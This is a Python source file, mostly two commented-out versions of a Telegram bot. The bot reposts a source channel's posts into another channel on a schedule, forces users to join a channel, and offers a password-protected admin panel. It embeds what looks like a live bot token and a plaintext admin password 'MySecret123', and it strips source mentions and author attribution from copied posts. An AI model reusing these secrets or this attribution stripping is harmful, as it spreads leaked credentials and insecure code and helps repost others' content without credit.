# # -*- coding: utf-8 -*-
# """
# Telegram Mirror Bot - Aiogram 3.x + Telethon
# --------------------------------------------
# - Force Join (فقط بار اول)
# - بلاک کاربرانی که جوین میدن و بعد لفت میکنن (با user_id و PHONE)
# - پشتیبانی از کانال‌های پرایویت و پابلیک
# - اسکجوال مستقیم از سورس → مقصد
# - پنل ادمین با پسورد
# """

# import os
# import re
# import random
# import asyncio
# import sqlite3
# from datetime import datetime, timedelta
# from typing import Optional, List

# from aiogram import Bot, Dispatcher, F
# from aiogram.filters import CommandStart, Command
# from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# from telethon import TelegramClient
# from telethon.tl.types import Message as TMessage, MessageMediaPoll

# # ==================== CONFIG DB ====================
# DB_PATH = "bot_config.sqlite"

# def cfg_connect():
#     conn = sqlite3.connect(DB_PATH)
#     conn.execute("PRAGMA journal_mode=WAL;")
#     return conn

# def cfg_init():
#     with cfg_connect() as conn:
#         conn.execute("""CREATE TABLE IF NOT EXISTS config(
#                             key TEXT PRIMARY KEY,
#                             val TEXT)""")
#         conn.execute("""CREATE TABLE IF NOT EXISTS sent_posts(
#                             msg_id INTEGER PRIMARY KEY)""")
#         conn.execute("""CREATE TABLE IF NOT EXISTS joined_users(
#                             user_id INTEGER PRIMARY KEY)""")
#         conn.execute("""CREATE TABLE IF NOT EXISTS blocked_users(
#                             user_id INTEGER PRIMARY KEY,
#                             phone TEXT)""")

# def cfg_set(k, v):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR REPLACE INTO config VALUES(?,?)", (k, v))

# def cfg_get(k, d=None):
#     with cfg_connect() as conn:
#         row = conn.execute("SELECT val FROM config WHERE key=?", (k,)).fetchone()
#         return row[0] if row else d

# def mark_joined(user_id: int):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR IGNORE INTO joined_users VALUES(?)", (user_id,))

# def has_joined(user_id: int) -> bool:
#     with cfg_connect() as conn:
#         row = conn.execute("SELECT 1 FROM joined_users WHERE user_id=?", (user_id,)).fetchone()
#         return bool(row)

# def block_user(user_id: int, phone: Optional[str] = None):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR IGNORE INTO blocked_users VALUES(?,?)", (user_id, phone))

# def is_blocked(user_id: int) -> bool:
#     with cfg_connect() as conn:
#         row = conn.execute("SELECT 1 FROM blocked_users WHERE user_id=?", (user_id,)).fetchone()
#         return bool(row)

# def get_blocked():
#     with cfg_connect() as conn:
#         return conn.execute("SELECT user_id, phone FROM blocked_users").fetchall()

# def get_users():
#     with cfg_connect() as conn:
#         return conn.execute("SELECT user_id FROM joined_users").fetchall()

# def mark_sent(msg_id: int):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR IGNORE INTO sent_posts VALUES(?)", (msg_id,))

# def already_sent(msg_id: int) -> bool:
#     with cfg_connect() as conn:
#         row = conn.execute("SELECT 1 FROM sent_posts WHERE msg_id=?", (msg_id,)).fetchone()
#         return bool(row)

# # ==================== TELETHON CLIENT ====================
# SESSIONS_DIR = "sessions"
# os.makedirs(SESSIONS_DIR, exist_ok=True)

# def make_client():
#     api_id = int(cfg_get("API_ID"))
#     api_hash = cfg_get("API_HASH")
#     session_name = cfg_get("SESSION_NAME", "mirror_session")
#     return TelegramClient(os.path.join(SESSIONS_DIR, session_name), api_id, api_hash)

# async def resolve_channel(client, raw: str):
#     raw = raw.strip()
#     try:
#         if raw.startswith("http"):
#             return await client.get_entity(raw)
#         elif raw.startswith("@"):
#             return await client.get_entity(raw)
#         else:
#             return await client.get_entity(int(raw))
#     except Exception as e:
#         print(f"❌ Failed to resolve {raw}: {e}")
#         return None

# # ==================== TEXT HELPERS ====================
# CAPTION_MAX = 1024
# TEXT_MAX = 4096

# def sanitize_text(txt: Optional[str], sources: List[str], footer: str) -> str:
#     if not txt:
#         txt = ""
#     cleaned = txt
#     for u in sources:
#         key = u.lower().lstrip("@")
#         pat = re.compile(rf"(?:@{re.escape(key)}\b|https?://t\.me/{re.escape(key)}\b)", flags=re.IGNORECASE)
#         cleaned = pat.sub("", cleaned)
#     cleaned = re.sub(r"\s{2,}", " ", cleaned).strip()
#     if footer and footer.lower() not in cleaned.lower():
#         sep = "\n\n" if cleaned else ""
#         cleaned = f"{cleaned}{sep}{footer}"
#     limit = CAPTION_MAX if len(cleaned) <= CAPTION_MAX else TEXT_MAX
#     return cleaned[:limit]

# # ==================== FORWARDER ====================
# async def schedule_from_source(client, src, dest, footer):
#     """اسکجوال مستقیم از سورس → مقصد (با محدودیت ۱۰ پست در روز)"""
#     start_time = datetime.now().replace(hour=10, minute=0, second=0)
#     end_time = datetime.now().replace(hour=22, minute=0, second=0)

#     # فقط 100 پست آخر از DESTINATION می‌خونیم
#     msgs = [m async for m in client.iter_messages(dest, reverse=True, limit=100)]

#     # ۱۰ پست در روز → فاصله حدودا ۷۲ دقیقه
#     interval = (end_time - start_time) / 10
#     t = start_time

#     for msg in msgs:
#         if t > end_time:
#             break
#         if already_sent(msg.id):  # تکراری اسکیپ
#             continue
#         send_at = t + timedelta(seconds=random.randint(-120, 120))
#         asyncio.create_task(send_later(client, msg, dest, footer, send_at))
#         t += interval

# async def send_later(client, msg, dest, footer, when: datetime):
#     wait = (when - datetime.now()).total_seconds()
#     if wait > 0:
#         await asyncio.sleep(wait)
#     await send_direct(client, "source", msg, dest, footer)

# async def send_direct(client, src_key: str, msg: TMessage, dest_entity, footer: str):
#     if already_sent(msg.id):
#         return
#     clean_text = sanitize_text(getattr(msg, "text", None), [src_key], footer)
#     if isinstance(msg.media, MessageMediaPoll):
#         return None
#     if msg.media:
#         await client.send_file(dest_entity, file=msg.media, caption=clean_text)
#     else:
#         await client.send_message(dest_entity, clean_text or footer)
#     mark_sent(msg.id)
#     await asyncio.sleep(0.5)

# async def run_forwarder():
#     client = make_client()
#     await client.start()

#     src = await resolve_channel(client, cfg_get("SOURCE"))
#     dest = await resolve_channel(client, cfg_get("DESTINATION"))
#     footer = cfg_get("FOOTER", "")

#     await schedule_from_source(client, src, dest, footer)

#     print("[*] Scheduler running...")
#     await client.run_until_disconnected()

# # ==================== FORCE JOIN ====================
# FORCE_CHANNELS = ["@netboxes"]

# def join_keyboard():
#     buttons = [[InlineKeyboardButton(text=f"Join {ch}", url=f"https://t.me/{ch.lstrip('@')}")] for ch in FORCE_CHANNELS]
#     buttons.append([InlineKeyboardButton(text="✅ I Joined", callback_data="check_join")])
#     return InlineKeyboardMarkup(inline_keyboard=buttons)

# async def check_user_joined(bot: Bot, user_id: int):
#     not_joined = []
#     for ch in FORCE_CHANNELS:
#         try:
#             member = await bot.get_chat_member(ch, user_id)
#             if member.status in ("left", "kicked"):
#                 not_joined.append(ch)
#         except:
#             not_joined.append(ch)
#     return not_joined

# # ==================== AIOGRAM BOT ====================
# BOT_TOKEN = os.getenv("BOT_TOKEN", "8211978487:AAH-7pNq5negJySX1gD3ggwLFwnMCNV8O1o")
# bot = Bot(BOT_TOKEN)
# dp = Dispatcher()

# # ادمین
# ADMIN_PASSWORD = "MySecret123"
# admin_sessions = set()

# @dp.message(CommandStart())
# async def start_cmd(message: Message):
#     if is_blocked(message.from_user.id):
#         await message.answer("⛔️ You are blocked from using this bot.")
#         return
#     if has_joined(message.from_user.id):
#         await message.answer("👋 Welcome back! Send /run to start or configure again.")
#     else:
#         kb = join_keyboard()
#         await message.answer("🚀 To continue using the bot you must join the following channels:", reply_markup=kb)

# @dp.callback_query(F.data == "check_join")
# async def check_join(callback: CallbackQuery):
#     not_joined = await check_user_joined(bot, callback.from_user.id)
#     if not_joined:
#         block_user(callback.from_user.id, cfg_get("PHONE"))  # بلاک
#         await callback.message.answer("❌ You are not a member of all required channels.\nPlease join and try again.", reply_markup=join_keyboard())
#     else:
#         mark_joined(callback.from_user.id)
#         await callback.message.answer("✅ Thanks for joining! Now send your API_ID:")
#         cfg_set("step", "api_id")

# @dp.message(Command("run"))
# async def run_cmd(message: Message):
#     if is_blocked(message.from_user.id):
#         await message.answer("⛔️ You are blocked from using this bot.")
#         return
#     await message.answer("🚀 Forwarder starting...")
#     asyncio.create_task(run_forwarder())

# @dp.message(Command("stop"))
# async def stop_cmd(message: Message):
#     await message.answer("⏹ Forwarder stopped. Restart bot if needed.")
#     os._exit(0)

# # پنل ادمین
# @dp.message(Command("admin"))
# async def admin_cmd(message: Message):
#     parts = message.text.split(maxsplit=1)
#     if len(parts) < 2:
#         await message.answer("❌ Usage: /admin <password>")
#         return
#     if parts[1] == ADMIN_PASSWORD:
#         admin_sessions.add(message.from_user.id)
#         await message.answer("✅ Admin access granted.")
#     else:
#         await message.answer("❌ Wrong password.")

# @dp.message(Command("blocked"))
# async def blocked_cmd(message: Message):
#     if message.from_user.id not in admin_sessions:
#         return
#     users = get_blocked()
#     if not users:
#         await message.answer("✅ No blocked users.")
#         return
#     text = "\n".join([f"ID: {u[0]}, Phone: {u[1]}" for u in users])
#     await message.answer("🚫 Blocked Users:\n" + text)

# @dp.message(Command("users"))
# async def users_cmd(message: Message):
#     if message.from_user.id not in admin_sessions:
#         return
#     users = get_users()
#     if not users:
#         await message.answer("ℹ️ No users yet.")
#         return
#     text = "\n".join([f"ID: {u[0]}" for u in users])
#     await message.answer("👥 Active Users:\n" + text)

# @dp.message(F.text)
# async def collect(message: Message):
#     if is_blocked(message.from_user.id):
#         await message.answer("⛔️ You are blocked from using this bot.")
#         return
#     step = cfg_get("step")
#     if step == "api_id":
#         cfg_set("API_ID", message.text.strip()); cfg_set("step", "api_hash")
#         await message.answer("✅ API_ID saved.\nNow send API_HASH:")
#     elif step == "api_hash":
#         cfg_set("API_HASH", message.text.strip()); cfg_set("step", "session_name")
#         await message.answer("✅ API_HASH saved.\nNow send SESSION_NAME:")
#     elif step == "session_name":
#         cfg_set("SESSION_NAME", message.text.strip()); cfg_set("step", "footer")
#         await message.answer("✅ SESSION_NAME saved.\nNow send FOOTER text:")
#     elif step == "footer":
#         cfg_set("FOOTER", message.text.strip()); cfg_set("step", "source")
#         await message.answer("✅ FOOTER saved.\nNow send SOURCE channel:")
#     elif step == "source":
#         cfg_set("SOURCE", message.text.strip()); cfg_set("step", "dest")
#         await message.answer("✅ SOURCE saved.\nNow send DESTINATION channel:")
#     elif step == "dest":
#         cfg_set("DESTINATION", message.text.strip()); cfg_set("step", "phone")
#         await message.answer("✅ DESTINATION saved.\nNow send PHONE (with +countrycode):")
#     elif step == "phone":
#         cfg_set("PHONE", message.text.strip()); cfg_set("step", "done")
#         await message.answer("✅ PHONE saved.\nAll config done! Now send /run to start.")

# async def main():
#     cfg_init()
#     await dp.start_polling(bot)

# if __name__ == "__main__":
#     asyncio.run(main())








# # -*- coding: utf-8 -*-
# """
# Telegram Mirror Bot - Aiogram 3.x + Telethon
# --------------------------------------------
# - Force Join
# - بلاک/آنبلاک کاربرانی که جوین میدن و بعد لفت میکنن
# - اسکجوال واقعی با DB (slot-based scheduler)
# - لایو لیسنر برای پیام‌های جدید
# - پنل ادمین با پسورد
# """

# import os
# import re
# import asyncio
# import sqlite3
# import pytz  # اضافه شده
# from collections import defaultdict  # اضافه شده
# from datetime import datetime, timedelta, date
# from typing import Optional, List, Dict

# from aiogram import Bot, Dispatcher, F
# from aiogram.filters import CommandStart, Command
# from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# from telethon import TelegramClient, events
# from telethon.tl.types import MessageMediaPoll, MessageMediaWebPage
# from telethon.tl.functions.messages import ForwardMessagesRequest

# # ==================== CONFIG DB ====================
# DB_PATH = "bot_config.sqlite"
# SCHEDULE_LIMIT = 50  # حداکثر پیام‌های اسکجوال‌شده مجاز در تلگرام
# POSTS_PER_DAY = 10
# START_LOCAL = 10
# END_LOCAL = 22
# IRAN_TZ = pytz.timezone("Asia/Tehran")

# def cfg_connect():
#     conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=60)
#     conn.execute("PRAGMA journal_mode=WAL;")
#     return conn

# def cfg_init():
#     with cfg_connect() as conn:
#         conn.execute("""CREATE TABLE IF NOT EXISTS config(
#                             key TEXT PRIMARY KEY,
#                             val TEXT)""")
#         conn.execute("""CREATE TABLE IF NOT EXISTS sent_posts(
#                             src_key TEXT,
#                             msg_id INTEGER,
#                             PRIMARY KEY(src_key, msg_id))""")
#         conn.execute("""CREATE TABLE IF NOT EXISTS joined_users(
#                             user_id INTEGER PRIMARY KEY)""")
#         conn.execute("""CREATE TABLE IF NOT EXISTS blocked_users(
#                             user_id INTEGER PRIMARY KEY)""")
#         conn.execute("""CREATE TABLE IF NOT EXISTS meta(
#                             key TEXT PRIMARY KEY,
#                             val TEXT)""")
#         conn.execute("""CREATE TABLE IF NOT EXISTS mapping(
#                             src_key TEXT,
#                             src_id INTEGER,
#                             dest_id INTEGER,
#                             PRIMARY KEY(src_key, src_id))""")
#         conn.execute("""CREATE TABLE IF NOT EXISTS scheduled(
#                             src_msg_id INTEGER PRIMARY KEY,
#                             schedule_ts INTEGER,
#                             album_gid INTEGER)""")

# def cfg_set(k, v):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR REPLACE INTO config VALUES(?,?)", (k, v))

# def cfg_get(k, d=None):
#     with cfg_connect() as conn:
#         row = conn.execute("SELECT val FROM config WHERE key=?", (k,)).fetchone()
#         return row[0] if row else d

# def mark_joined(user_id: int):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR IGNORE INTO joined_users VALUES(?)", (user_id,))

# def has_joined(user_id: int) -> bool:
#     with cfg_connect() as conn:
#         row = conn.execute("SELECT 1 FROM joined_users WHERE user_id=?", (user_id,)).fetchone()
#         return bool(row)

# def block_user(user_id: int):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR IGNORE INTO blocked_users VALUES(?)", (user_id,))

# def unblock_user(user_id: int):
#     with cfg_connect() as conn:
#         conn.execute("DELETE FROM blocked_users WHERE user_id=?", (user_id,))

# def is_blocked(user_id: int) -> bool:
#     with cfg_connect() as conn:
#         row = conn.execute("SELECT 1 FROM blocked_users WHERE user_id=?", (user_id,)).fetchone()
#         return bool(row)

# def get_blocked():
#     with cfg_connect() as conn:
#         return conn.execute("SELECT user_id FROM blocked_users").fetchall()

# def get_users():
#     with cfg_connect() as conn:
#         return conn.execute("SELECT user_id FROM joined_users").fetchall()

# def was_processed(src_key: str, msg_id: int) -> bool:
#     with cfg_connect() as conn:
#         row = conn.execute("SELECT 1 FROM sent_posts WHERE src_key=? AND msg_id=?", (src_key, msg_id)).fetchone()
#         return bool(row)

# def mark_processed(src_key: str, msg_id: int):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR IGNORE INTO sent_posts VALUES(?, ?)", (src_key, msg_id))

# def save_mapping(src_key: str, src_id: int, dest_id: int):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR REPLACE INTO mapping VALUES(?,?,?)", (src_key, src_id, dest_id))

# def scheduled_add(src_id: int, when_epoch: int, album_gid: int | None):
#     with cfg_connect() as conn:
#         conn.execute("INSERT OR REPLACE INTO scheduled(src_msg_id, schedule_ts, album_gid) VALUES(?,?,?)",
#                      (src_id, when_epoch, album_gid))

# # ==================== TELETHON CLIENT ====================
# SESSIONS_DIR = "sessions"
# os.makedirs(SESSIONS_DIR, exist_ok=True)

# def make_client():
#     api_id = int(cfg_get("API_ID"))
#     api_hash = cfg_get("API_HASH")
#     session_name = cfg_get("SESSION_NAME", "mirror_session")
#     return TelegramClient(os.path.join(SESSIONS_DIR, session_name), api_id, api_hash)

# async def resolve_channel(client, raw: str):
#     raw = raw.strip()
#     try:
#         if raw.startswith("http") or raw.startswith("@"):
#             return await client.get_entity(raw)
#         else:
#             return await client.get_entity(int(raw))
#     except Exception as e:
#         print(f"❌ Failed to resolve {raw}: {e}")
#         return None

# # ==================== TEXT HELPERS ====================
# CAPTION_MAX = 1024
# TEXT_MAX = 4096

# def sanitize_text(txt: Optional[str], sources: List[str], footer: str) -> str:
#     if not txt:
#         txt = ""
#     cleaned = txt
#     for u in sources:
#         key = u.lower().lstrip("@")
#         pat = re.compile(rf"(?:@{re.escape(key)}\b|https?://t\.me/{re.escape(key)}\b)", flags=re.IGNORECASE)
#         cleaned = pat.sub("", cleaned)
#     cleaned = re.sub(r"\s{2,}", " ", cleaned).strip()
#     if footer and footer.lower() not in cleaned.lower():
#         sep = "\n\n" if cleaned else ""
#         cleaned = f"{cleaned}{sep}{footer}"
#     limit = CAPTION_MAX if len(cleaned) <= CAPTION_MAX else TEXT_MAX
#     return cleaned[:limit]

# # ==================== SLOT SCHEDULER ====================
# def _local_now() -> datetime:
#     return datetime.now(IRAN_TZ)

# def _build_slots_for_day(day: date) -> List[datetime]:
#     """ساخت اسلات‌های زمانی برای یک روز (۱۰ صبح تا ۱۰ شب، ۱۰ پست)"""
#     base_dt = IRAN_TZ.localize(datetime(day.year, day.month, day.day, START_LOCAL, 0, 0))
#     hours_per_day = END_LOCAL - START_LOCAL
#     interval_minutes = (hours_per_day * 60) // POSTS_PER_DAY
#     return [base_dt + timedelta(minutes=i * interval_minutes) for i in range(POSTS_PER_DAY)]

# def _next_schedule_dt() -> datetime:
#     """
#     اسلات بعدی را به صورت اتمیک از DB انتخاب می‌کند.
#     - اگر زمان‌ها خیلی دور هستن، ریست می‌کنه.
#     """
#     now = _local_now()
#     today_key = now.date().strftime("%Y%m%d")

#     with cfg_connect() as conn:
#         c = conn.cursor()
#         c.execute("BEGIN IMMEDIATE")

#         c.execute("SELECT val FROM meta WHERE key='sched_day'")
#         row_day = c.fetchone()
#         cur_day = row_day[0] if row_day else ""

#         c.execute("SELECT val FROM meta WHERE key='sched_idx'")
#         row_idx = c.fetchone()
#         cur_idx = int(row_idx[0] if row_idx else 0)

#         if cur_day:
#             y, m, d = int(cur_day[:4]), int(cur_day[4:6]), int(cur_day[6:])
#             work_date = date(y, m, d)
#             if work_date > now.date() + timedelta(days=5):
#                 cur_day = ""
#                 cur_idx = 0

#         if not cur_day or cur_day < today_key:
#             work_day = today_key
#             cur_idx = 0
#         else:
#             work_day = cur_day

#         if work_day == today_key:
#             base_date = now.date()
#         else:
#             y, m, d = int(work_day[:4]), int(work_day[4:6]), int(work_day[6:])
#             base_date = date(y, m, d)

#         slots = _build_slots_for_day(base_date)

#         if work_day == today_key:
#             while cur_idx < len(slots) and slots[cur_idx] <= now:
#                 cur_idx += 1

#         if cur_idx >= len(slots):
#             next_date = base_date + timedelta(days=1)
#             slots_next = _build_slots_for_day(next_date)
#             sched_dt = slots_next[0]
#             next_day_key = next_date.strftime("%Y%m%d")
#             c.execute("INSERT OR REPLACE INTO meta(key,val) VALUES('sched_day', ?)", (next_day_key,))
#             c.execute("INSERT OR REPLACE INTO meta(key,val) VALUES('sched_idx', '1')")
#         else:
#             sched_dt = slots[cur_idx]
#             c.execute("INSERT OR REPLACE INTO meta(key,val) VALUES('sched_day', ?)", (work_day,))
#             c.execute("INSERT OR REPLACE INTO meta(key,val) VALUES('sched_idx', ?)", (str(cur_idx + 1),))

#         conn.commit()
#         return sched_dt

# # ==================== SEND HELPERS ====================
# async def count_scheduled(client, dest_entity) -> int:
#     try:
#         result = await client.get_scheduled_history(dest_entity, limit=0)
#         return result.count
#     except Exception as e:
#         print(f"[❌] Error counting scheduled messages: {e}")
#         return 0

# async def _forward_single_message_scheduled(client, src_entity, msg, dest_entity, schedule_dt: datetime):
#     """ارسال پیام تکی با زمان‌بندی"""
#     schedule_ts = int(schedule_dt.astimezone(pytz.utc).timestamp())
#     try:
#         res = await client(ForwardMessagesRequest(
#             from_peer=src_entity,
#             id=[msg.id],
#             to_peer=dest_entity,
#             drop_author=True,
#             schedule_date=schedule_ts
#         ))
#         await asyncio.sleep(1)
#         return res
#     except Exception as e:
#         print(f"[❌] Error forwarding single message {msg.id}: {e}")
#         return None

# async def _forward_album_scheduled(client, src_entity, messages, dest_entity, schedule_dt: datetime):
#     """ارسال آلبوم با زمان‌بندی"""
#     messages = sorted(messages, key=lambda m: m.id)
#     ids = [m.id for m in messages]
#     schedule_ts = int(schedule_dt.astimezone(pytz.utc).timestamp())
#     try:
#         res = await client(ForwardMessagesRequest(
#             from_peer=src_entity,
#             id=ids,
#             to_peer=dest_entity,
#             drop_author=True,
#             schedule_date=schedule_ts
#         ))
#         await asyncio.sleep(1)
#         return res
#     except Exception as e:
#         print(f"[❌] Error forwarding album: {e}")
#         return None

# # ==================== LIVE LISTENER ====================
# SCHEDULE_LIMIT = 50
# _live_album_buffer = defaultdict(list)
# _live_album_tasks = {}

# async def handle_new_message(event: events.NewMessage.Event, dest_entity, source_id_to_key: Dict[int, str]):
#     msg = event.message
#     src_key = source_id_to_key.get(event.chat_id)
#     if not src_key:
#         return

#     if was_processed(src_key, msg.id):
#         return

#     scheduled_now = await count_scheduled(event.client, dest_entity)
#     if scheduled_now >= SCHEDULE_LIMIT:
#         print(f"[LIVE][{src_key}] SKIP: scheduled={scheduled_now} (limit={SCHEDULE_LIMIT}).")
#         return

#     if msg.grouped_id:
#         _live_album_buffer[msg.grouped_id].append(msg)
#         if msg.grouped_id not in _live_album_tasks:
#             _live_album_tasks[msg.grouped_id] = asyncio.create_task(
#                 _flush_live_album(msg.grouped_id, event.client, dest_entity, src_key)
#             )
#         return

#     schedule_dt = _next_schedule_dt()
#     res = await _forward_single_message_scheduled(event.client, event.chat, msg, dest_entity, schedule_dt)
#     if res and res.updates:
#         dest_id = res.updates[0].id
#         save_mapping(src_key, msg.id, dest_id)
#         mark_processed(src_key, msg.id)
#         scheduled_add(msg.id, int(schedule_dt.timestamp()), None)
#         print(f"[LIVE][{src_key}] {msg.id} -> {dest_id} scheduled at {schedule_dt.isoformat()}")

# async def _flush_live_album(grouped_id, client, dest_entity, src_key):
#     """بعد از کمی صبر، آلبوم جمع‌شده را یک‌جا زمان‌بندی می‌کند."""
#     await asyncio.sleep(2.0)
#     msgs = _live_album_buffer.pop(grouped_id, [])
#     if not msgs:
#         return
#     not_done = [m for m in msgs if not was_processed(src_key, m.id)]
#     if not_done:
#         schedule_dt = _next_schedule_dt()
#         res = await _forward_album_scheduled(client, not_done[0].peer_id, not_done, dest_entity, schedule_dt)
#         if res and res.updates:
#             dest_ids = [update.id for update in res.updates]
#             for m, d_id in zip(not_done, dest_ids):
#                 save_mapping(src_key, m.id, d_id)
#                 mark_processed(src_key, m.id)
#                 scheduled_add(m.id, int(schedule_dt.timestamp()), grouped_id)
#             print(f"[LIVE][{src_key}] Album {grouped_id} -> {dest_ids} scheduled at {schedule_dt.isoformat()}")

# # ==================== FORCE JOIN + AIOGRAM BOT ====================
# BOT_TOKEN = os.getenv("BOT_TOKEN", "8211978487:AAH-7pNq5negJySX1gD3ggwLFwnMCNV8O1o")
# bot = Bot(BOT_TOKEN)
# dp = Dispatcher()

# ADMIN_PASSWORD = "MySecret123"
# admin_sessions = set()

# FORCE_CHANNELS = ["@netboxes"]

# def join_keyboard():
#     buttons = [[InlineKeyboardButton(text=f"Join {ch}", url=f"https://t.me/{ch.lstrip('@')}")] for ch in FORCE_CHANNELS]
#     buttons.append([InlineKeyboardButton(text="✅ I Joined", callback_data="check_join")])
#     return InlineKeyboardMarkup(inline_keyboard=buttons)

# async def check_user_joined(bot: Bot, user_id: int):
#     not_joined = []
#     for ch in FORCE_CHANNELS:
#         try:
#             member = await bot.get_chat_member(ch, user_id)
#             if member.status in ("left", "kicked"):
#                 not_joined.append(ch)
#         except:
#             not_joined.append(ch)
#     return not_joined

# @dp.message(CommandStart())
# async def start_cmd(message: Message):
#     if is_blocked(message.from_user.id):
#         await message.answer("⛔️ You are blocked from using this bot.")
#         return
#     if has_joined(message.from_user.id):
#         await message.answer("👋 Welcome back! Send /run to start.")
#     else:
#         await message.answer("🚀 Join required channels:", reply_markup=join_keyboard())

# @dp.callback_query(F.data == "check_join")
# async def check_join(callback: CallbackQuery):
#     not_joined = await check_user_joined(bot, callback.from_user.id)
#     if not_joined:
#         block_user(callback.from_user.id)
#         await callback.message.answer("❌ Not joined.", reply_markup=join_keyboard())
#     else:
#         mark_joined(callback.from_user.id)
#         await callback.message.answer("✅ Joined! Now send API_ID:")
#         cfg_set("step", "api_id")

# @dp.message(Command("run"))
# async def run_cmd(message: Message):
#     if is_blocked(message.from_user.id):
#         await message.answer("⛔️ You are blocked from using this bot.")
#         return
#     asyncio.create_task(run_forwarder())
#     await message.answer("🚀 Forwarder started with live listener.")

# @dp.message(Command("reset_sched"))
# async def reset_sched_cmd(message: Message):
#     if message.from_user.id not in admin_sessions:
#         return
#     with cfg_connect() as conn:
#         conn.execute("DELETE FROM meta WHERE key IN ('sched_day', 'sched_idx')")
#         conn.execute("DELETE FROM scheduled")
#     await message.answer("✅ Schedule settings have been reset. Now run /run again.")

# @dp.message(Command("admin"))
# async def admin_cmd(message: Message):
#     parts = message.text.split(maxsplit=1)
#     if len(parts) < 2:
#         await message.answer("❌ Usage: /admin <password>")
#         return
#     if parts[1] == ADMIN_PASSWORD:
#         admin_sessions.add(message.from_user.id)
#         await message.answer("✅ Admin access granted.")
#     else:
#         await message.answer("❌ Wrong password.")

# @dp.message(Command("blocked"))
# async def blocked_cmd(message: Message):
#     if message.from_user.id not in admin_sessions:
#         return
#     users = get_blocked()
#     if not users:
#         await message.answer("✅ No blocked users.")
#         return
#     text = "\n".join([f"ID: {u[0]}" for u in users])
#     await message.answer("🚫 Blocked Users:\n" + text)

# @dp.message(Command("unblock"))
# async def unblock_cmd(message: Message):
#     if message.from_user.id not in admin_sessions:
#         return
#     parts = message.text.split(maxsplit=1)
#     if len(parts) < 2:
#         await message.answer("❌ Usage: /unblock <user_id>")
#         return
#     try:
#         uid = int(parts[1])
#         unblock_user(uid)
#         await message.answer(f"✅ User {uid} has been unblocked.")
#     except Exception as e:
#         await message.answer(f"❌ Error: {e}")

# @dp.message(Command("users"))
# async def users_cmd(message: Message):
#     if message.from_user.id not in admin_sessions:
#         return
#     users = get_users()
#     if not users:
#         await message.answer("ℹ️ No users yet.")
#         return
#     text = "\n".join([f"ID: {u[0]}" for u in users])
#     await message.answer("👥 Active Users:\n" + text)

# @dp.message(F.text)
# async def collect(message: Message):
#     if is_blocked(message.from_user.id):
#         await message.answer("⛔️ You are blocked from using this bot.")
#         return
#     step = cfg_get("step")
#     if step == "api_id":
#         cfg_set("API_ID", message.text.strip()); cfg_set("step", "api_hash")
#         await message.answer("✅ API_ID saved.\nNow send API_HASH:")
#     elif step == "api_hash":
#         cfg_set("API_HASH", message.text.strip()); cfg_set("step", "session_name")
#         await message.answer("✅ API_HASH saved.\nNow send SESSION_NAME:")
#     elif step == "session_name":
#         cfg_set("SESSION_NAME", message.text.strip()); cfg_set("step", "footer")
#         await message.answer("✅ SESSION_NAME saved.\nNow send FOOTER text:")
#     elif step == "footer":
#         cfg_set("FOOTER", message.text.strip()); cfg_set("step", "source")
#         await message.answer("✅ FOOTER saved.\nNow send SOURCE channel:")
#     elif step == "source":
#         cfg_set("SOURCE", message.text.strip()); cfg_set("step", "dest")
#         await message.answer("✅ SOURCE saved.\nNow send DESTINATION channel:")
#     elif step == "dest":
#         cfg_set("DESTINATION", message.text.strip()); cfg_set("step", "done")
#         await message.answer("✅ DESTINATION saved.\nAll config done! Now send /run to start.")

# async def backfill_messages(client, src, dest):
#     """گرفتن 100 پست آخر و اسکجوال آنها"""
#     msgs = [m async for m in client.iter_messages(src, limit=100, reverse=False)]
#     msgs.reverse()
#     album_bucket = defaultdict(list)

#     src_key = cfg_get("SOURCE").lstrip("@")

#     for msg in msgs:
#         if was_processed(src_key, msg.id) or isinstance(msg.media, MessageMediaPoll):
#             continue

#         if msg.grouped_id:
#             album_bucket[msg.grouped_id].append(msg)
#             continue

#         schedule_dt = _next_schedule_dt()
#         res = await _forward_single_message_scheduled(client, src, msg, dest, schedule_dt)
#         if res and res.updates:
#             dest_id = res.updates[0].id
#             save_mapping(src_key, msg.id, dest_id)
#             mark_processed(src_key, msg.id)
#             scheduled_add(msg.id, int(schedule_dt.timestamp()), None)
#             print(f"[BACKFILL] {msg.id} -> {dest_id} scheduled at {schedule_dt.isoformat()}")

#     for gid, items in album_bucket.items():
#         if not items:
#             continue
#         schedule_dt = _next_schedule_dt()
#         res = await _forward_album_scheduled(client, src, items, dest, schedule_dt)
#         if res and res.updates:
#             dest_ids = [update.id for update in res.updates]
#             for m, d_id in zip(items, dest_ids):
#                 save_mapping(src_key, m.id, d_id)
#                 mark_processed(src_key, m.id)
#                 scheduled_add(m.id, int(schedule_dt.timestamp()), gid)
#             print(f"[BACKFILL] Album {gid} -> {dest_ids} scheduled at {schedule_dt.isoformat()}")

# async def run_forwarder():
#     client = make_client()
#     await client.start()

#     src = await resolve_channel(client, cfg_get("SOURCE"))
#     dest = await resolve_channel(client, cfg_get("DESTINATION"))

#     src_key = cfg_get("SOURCE").lstrip("@")
#     source_id_to_key = {src.id: src_key}

#     await backfill_messages(client, src, dest)

#     @client.on(events.NewMessage(chats=src))
#     async def handler(event):
#         await handle_new_message(event, dest, source_id_to_key)

#     print("[*] Live listener running...")
#     await client.run_until_disconnected()

# async def main():
#     cfg_init()
#     await dp.start_polling(bot)

# if __name__ == "__main__":
#     asyncio.run(main())










# -*- coding: utf-8 -*-
import os, re, asyncio
import pytz
from datetime import datetime, timedelta, date

from dotenv import load_dotenv

# اول سعی کن فایل api.env رو از پوشه جاری لود کن
env_path = os.path.join(os.path.dirname(__file__), "api.env")
if os.path.exists(env_path):
    load_dotenv(env_path)

# حالا مقدار رو از سیستم env بخون (اگر توی Render یا GitHub باشه از اونجا میاد)
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))


from aiogram import Bot, Dispatcher, Router, types
from aiogram.enums import ParseMode
